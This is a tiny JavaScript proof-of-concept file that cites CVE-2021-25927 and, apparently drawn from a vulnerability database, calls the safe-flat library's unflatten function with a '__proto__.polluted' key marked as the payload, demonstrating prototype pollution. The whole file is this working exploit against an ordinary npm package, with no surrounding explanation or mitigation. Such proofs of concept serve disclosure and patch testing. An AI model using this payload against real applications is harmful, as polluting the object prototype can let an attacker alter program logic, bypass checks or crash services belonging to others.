//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25927
 
  var safeFlat = require("safe-flat");
  obj = {};

   

  safeFlat.unflatten({ "__proto__.polluted": "yes" }, "."); //payload
// End of file
